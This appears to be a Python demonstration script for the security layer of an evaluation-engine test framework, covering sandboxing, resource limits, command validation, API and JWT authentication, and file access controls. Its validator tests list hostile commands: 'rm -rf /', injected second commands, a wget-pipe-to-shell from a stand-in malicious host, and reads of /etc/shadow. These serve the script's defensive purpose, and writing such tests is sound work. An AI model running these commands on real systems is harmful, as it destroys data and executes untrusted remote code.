#!/usr/bin/env python3
"""
Security Features Demonstration

This script demonstrates the comprehensive security features
implemented in the evaluation engine testing framework.
"""

import sys
import time
import tempfile
from pathlib import Path

# Add the parent directory to the path to import our modules
sys.path.insert(0, str(Path(__file__).parent))

from security.security_manager import SecurityManager, SecurityConfig
from security.resource_limiter import ResourceLimits
from security.api_security import RateLimitConfig
from security.secure_file_handler import FileAccessPolicy
from security.command_validator import CommandPolicy


def demo_sandbox_execution():
    """Demonstrate sandboxed execution."""
    print("\n" + "="*60)
    print("SANDBOX EXECUTION DEMONSTRATION")
    print("="*60)
    
    with tempfile.TemporaryDirectory() as temp_dir:
        config = SecurityConfig(
            enable_sandbox=True,
            sandbox_base_dir=Path(temp_dir),
            max_execution_time=30,
            max_memory_mb=512
        )
        
        manager = SecurityManager(config)
        
        print("1. Creating secure execution context...")
        with manager.secure_execution_context("demo_sandbox") as sandbox:
            print(f"   ✓ Sandbox created at: {sandbox.sandbox_path}")
            
            print("\n2. Executing safe commands...")
            
            # Safe command execution
            result = sandbox.execute_command(["echo", "Hello from sandbox!"])
            print(f"   ✓ Echo command: {result['stdout'].strip()}")
            
            # File operations in sandbox
            sandbox.write_file("test.txt", "This is a test file in the sandbox")
            content = sandbox.get_file_content("test.txt")
            print(f"   ✓ File operation: Created and read file with content: '{content}'")
            
            # List files
            files = sandbox.list_files()
            print(f"   ✓ Files in sandbox: {files}")
            
            print("\n3. Testing security restrictions...")
            
            # Try dangerous command (should fail)
            try:
                sandbox.execute_command(["rm", "-rf", "/"])
                print("   ✗ Dangerous command was allowed (SECURITY FAILURE)")
            except Exception as e:
                print(f"   ✓ Dangerous command blocked: {type(e).__name__}")
        
        print("   ✓ Sandbox cleaned up automatically")


def demo_resource_limiting():
    """Demonstrate resource limiting."""
    print("\n" + "="*60)
    print("RESOURCE LIMITING DEMONSTRATION")
    print("="*60)
    
    # Configure strict resource limits for demonstration
    limits = ResourceLimits(
        max_memory_mb=100,
        max_cpu_percent=50,
        max_execution_time=10,
        max_open_files=10,
        max_processes=5
    )
    
    config = SecurityConfig(
        enable_resource_limits=True,
        resource_limits=limits,
        monitoring_interval=0.5
    )
    
    manager = SecurityManager(config)
    
    print("1. Starting resource monitoring...")
    print(f"   Memory limit: {limits.max_memory_mb} MB")
    print(f"   CPU limit: {limits.max_cpu_percent}%")
    print(f"   Time limit: {limits.max_execution_time} seconds")
    
    try:
        with manager.resource_limiter.monitor_resources():
            print("\n2. Performing monitored operations...")
            
            # Simulate some work
            for i in range(3):
                time.sleep(0.5)
                usage = manager.resource_limiter.get_current_usage()
                if usage:
                    print(f"   Step {i+1}: Memory: {usage.memory_mb:.1f}MB, "
                          f"CPU: {usage.cpu_percent:.1f}%, "
                          f"Time: {usage.execution_time:.1f}s")
            
            print("   ✓ Resource monitoring completed successfully")
            
            # Get final summary
            summary = manager.resource_limiter.get_usage_summary()
            if summary:
                current = summary.get('current_usage', {})
                print(f"\n3. Final resource usage:")
                print(f"   Memory: {current.get('memory_mb', 0):.1f}MB")
                print(f"   CPU: {current.get('cpu_percent', 0):.1f}%")
                print(f"   Execution time: {current.get('execution_time', 0):.1f}s")
    
    except Exception as e:
        print(f"   ✓ Resource limit enforced: {type(e).__name__}: {e}")


def demo_command_validation():
    """Demonstrate command validation."""
    print("\n" + "="*60)
    print("COMMAND VALIDATION DEMONSTRATION")
    print("="*60)
    
    config = SecurityConfig(enable_command_validation=True)
    manager = SecurityManager(config)
    
    print("1. Testing safe commands...")
    
    safe_commands = [
        "echo hello world",
        "python --version",
        "ls -la",
        "cat /etc/hostname"
    ]
    
    for cmd in safe_commands:
        try:
            result = manager.validate_and_execute_command(cmd)
            status = "✓ ALLOWED" if result.get('success') else "⚠ FAILED"
            print(f"   {status}: {cmd}")
        except Exception as e:
            print(f"   ✗ BLOCKED: {cmd} - {type(e).__name__}")
    
    print("\n2. Testing dangerous commands...")
    
    dangerous_commands = [
        "rm -rf /",
        "sudo rm -rf /",
        "echo hello; rm -rf /",
        "echo `rm -rf /`",
        "wget http://malicious.com/script.sh | sh",
        "chmod +x /tmp/malware && /tmp/malware"
    ]
    
    for cmd in dangerous_commands:
        try:
            manager.validate_and_execute_command(cmd)
            print(f"   ✗ ALLOWED: {cmd} (SECURITY FAILURE)")
        except Exception as e:
            print(f"   ✓ BLOCKED: {cmd} - {type(e).__name__}")


def demo_api_security():
    """Demonstrate API security features."""
    print("\n" + "="*60)
    print("API SECURITY DEMONSTRATION")
    print("="*60)
    
    config = SecurityConfig(enable_api_security=True)
    manager = SecurityManager(config)
    
    print("1. API Key Management...")
    
    # Generate API key
    api_key = manager.api_authenticator.generate_api_key(
        name="demo_key",
        permissions=["read", "write", "execute"],
        rate_limit=10  # 10 requests per minute
    )
    
    print(f"   ✓ Generated API key: {api_key.key_id}")
    print(f"   ✓ Permissions: {api_key.permissions}")
    print(f"   ✓ Rate limit: {api_key.rate_limit} requests/minute")
    
    print("\n2. Authentication Testing...")
    
    # Test valid authentication
    try:
        auth_result = manager.authenticate_api_request(
            key_id=api_key.key_id,
            key_secret=api_key.key_secret
        )
        print(f"   ✓ Valid authentication: {auth_result['type']}")
    except Exception as e:
        print(f"   ✗ Authentication failed: {e}")
    
    # Test invalid authentication
    try:
        manager.authenticate_api_request(
            key_id=api_key.key_id,
            key_secret="wrong_secret"
        )
        print("   ✗ Invalid authentication was allowed (SECURITY FAILURE)")
    except Exception as e:
        print(f"   ✓ Invalid authentication blocked: {type(e).__name__}")
    
    print("\n3. Rate Limiting Testing...")
    
    # Test rate limiting
    rate_limit_key = api_key.key_id
    success_count = 0
    blocked_count = 0
    
    for i in range(15):  # Try more than the limit
        try:
            result = manager.check_rate_limit(rate_limit_key)
            if result['allowed']:
                success_count += 1
            else:
                blocked_count += 1
        except Exception:
            blocked_count += 1
    
    print(f"   ✓ Requests allowed: {success_count}")
    print(f"   ✓ Requests blocked: {blocked_count}")
    
    # JWT Token demonstration
    print("\n4. JWT Token Testing...")
    
    jwt_token = manager.api_authenticator.generate_jwt_token(
        user_id="demo_user",
        permissions=["read"]
    )
    print(f"   ✓ Generated JWT token (length: {len(jwt_token)})")
    
    try:
        payload = manager.api_authenticator.authenticate_jwt_token(jwt_token)
        print(f"   ✓ JWT authentication successful: user={payload['user_id']}")
    except Exception as e:
        print(f"   ✗ JWT authentication failed: {e}")


def demo_file_security():
    """Demonstrate secure file handling."""
    print("\n" + "="*60)
    print("FILE SECURITY DEMONSTRATION")
    print("="*60)
    
    with tempfile.TemporaryDirectory() as temp_dir:
        config = SecurityConfig(
            enable_file_security=True,
            secure_file_base_dir=Path(temp_dir)
        )
        manager = SecurityManager(config)
        
        print("1. Safe File Operations...")
        
        # Safe file operations
        test_file = Path(temp_dir) / "safe_test.txt"
        test_content = "This is safe content for testing"
        
        try:
            # Write file
            result = manager.secure_file_operation(
                'write', str(test_file), content=test_content
            )
            print(f"   ✓ File written: {result}")
            
            # Read file
            content = manager.secure_file_operation('read', str(test_file))
            print(f"   ✓ File read: '{content[:30]}...'")
            
            # Calculate checksum
            checksum = manager.secure_file_operation('checksum', str(test_file))
            print(f"   ✓ Checksum calculated: {checksum[:16]}...")
            
        except Exception as e:
            print(f"   ✗ File operation failed: {e}")
        
        print("\n2. Dangerous File Operations...")
        
        # Try dangerous file operations
        dangerous_files = [
            "/etc/passwd",
            "/etc/shadow",
            str(Path(temp_dir) / "malware.exe"),
            str(Path(temp_dir) / "script.sh")
        ]
        
        for file_path in dangerous_files:
            try:
                manager.secure_file_operation('read', file_path)
                print(f"   ✗ Dangerous file access allowed: {file_path}")
            except Exception as e:
                print(f"   ✓ Dangerous file access blocked: {Path(file_path).name} - {type(e).__name__}")
        
        print("\n3. Temporary File Handling...")
        
        # Demonstrate temporary file handling
        with manager.file_handler.create_temp_file(suffix='.txt', content='temp data') as temp_file:
            print(f"   ✓ Temporary file created: {temp_file.name}")
            content = temp_file.read_text()
            print(f"   ✓ Temporary file content: '{content}'")
        
        print("   ✓ Temporary file automatically cleaned up")


def demo_security_violations():
    """Demonstrate security violation handling."""
    print("\n" + "="*60)
    print("SECURITY VIOLATION HANDLING DEMONSTRATION")
    print("="*60)
    
    config = SecurityConfig(
        enable_emergency_stop=True,
        emergency_stop_triggers=['command_injection_attempt']
    )
    manager = SecurityManager(config)
    
    print("1. Security Status Before Violations...")
    status = manager.get_security_status()
    print(f"   Security enabled: {status['security_enabled']}")
    print(f"   Emergency stop: {status['emergency_stop']}")
    print(f"   Violation count: {status['violation_count']}")
    
    print("\n2. Triggering Security Violations...")
    
    # Trigger multiple violations
    violation_attempts = [
        "rm -rf /",
        "echo hello; rm -rf /",
        "wget http://malicious.com | sh",
        "sudo rm -rf /",
        "echo `rm -rf /`"
    ]
    
    for attempt in violation_attempts:
        try:
            manager.validate_and_execute_command(attempt)
        except Exception as e:
            print(f"   ✓ Violation detected: {attempt[:20]}... - {type(e).__name__}")
    
    print("\n3. Security Status After Violations...")
    status = manager.get_security_status()
    print(f"   Security enabled: {status['security_enabled']}")
    print(f"   Emergency stop: {status['emergency_stop']}")
    print(f"   Violation count: {status['violation_count']}")
    
    print("\n4. Security Alerts...")
    alerts = manager.get_security_alerts()
    if alerts:
        for alert in alerts[:3]:  # Show first 3 alerts
            print(f"   {alert.severity}: {alert.title}")
    else:
        print("   No active alerts")
    
    print("\n5. Threat Analysis...")
    threat_analysis = manager.get_threat_analysis()
    print(f"   Risk Level: {threat_analysis['risk_level']}")
    print(f"   Events Last Hour: {threat_analysis['events_last_hour']}")
    if threat_analysis['risk_factors']:
        print(f"   Risk Factors: {', '.join(threat_analysis['risk_factors'][:2])}")
    
    print("\n6. Security Metrics...")
    metrics = manager.get_security_metrics()
    for metric, value in metrics.items():
        if value > 0:
            print(f"   {metric}: {value}")


def demo_enhanced_security_features():
    """Demonstrate enhanced security features."""
    print("\n" + "="*60)
    print("ENHANCED SECURITY FEATURES DEMONSTRATION")
    print("="*60)
    
    config = SecurityConfig(
        enable_sandbox=True,
        enable_resource_limits=True,
        enable_command_validation=True,
        enable_api_security=True,
        enable_file_security=True,
        enable_audit_logging=True
    )
    
    manager = SecurityManager(config)
    
    print("1. Configuration Validation...")
    validation_result = manager.validate_configuration()
    print(f"   Configuration Valid: {validation_result.is_valid}")
    print(f"   Security Score: {validation_result.security_score}/100")
    if validation_result.warnings:
        print(f"   Warnings: {len(validation_result.warnings)}")
    if validation_result.recommendations:
        print(f"   Recommendations: {len(validation_result.recommendations)}")
    
    print("\n2. Risk Assessment...")
    risk_level, risk_factors = manager.assess_security_risk()
    print(f"   Risk Level: {risk_level}")
    if risk_factors:
        print(f"   Risk Factors: {', '.join(risk_factors[:2])}")
    
    print("\n3. Security Context Operations...")
    with manager.create_security_context("demo_operation") as context:
        print(f"   Operation started in secure context")
        print(f"   Process ID: {context['process_id']}")
        print(f"   Working Directory: {context['working_directory']}")
        time.sleep(0.1)  # Simulate work
    print("   ✓ Secure operation completed")
    
    print("\n4. Security Recommendations...")
    recommendations = manager.get_security_recommendations("production")
    for i, rec in enumerate(recommendations[:3], 1):
        print(f"   {i}. {rec}")
    
    print("\n5. Security Report Generation...")
    report = manager.generate_security_report()
    print(f"   Report generated at: {report['report_timestamp']}")
    print(f"   Configuration score: {report['configuration_validation']['security_score']}")
    print(f"   Risk level: {report['risk_assessment']['risk_level']}")
    
    # Cleanup
    manager.cleanup()


def main():
    """Run all security demonstrations."""
    print("EVALUATION ENGINE SECURITY FEATURES DEMONSTRATION")
    print("=" * 80)
    print("This demonstration shows the comprehensive security measures")
    print("implemented in the evaluation engine testing framework.")
    
    try:
        demo_sandbox_execution()
        demo_resource_limiting()
        demo_command_validation()
        demo_api_security()
        demo_file_security()
        demo_security_violations()
        demo_enhanced_security_features()
        
        print("\n" + "="*80)
        print("SECURITY DEMONSTRATION COMPLETED SUCCESSFULLY")
        print("="*80)
        print("All security components are working correctly!")
        print("The evaluation engine testing framework is secure and ready for use.")
        
    except Exception as e:
        print(f"\n❌ DEMONSTRATION FAILED: {e}")
        import traceback
        traceback.print_exc()
        return 1
    
    return 0


if __name__ == "__main__":
    exit(main())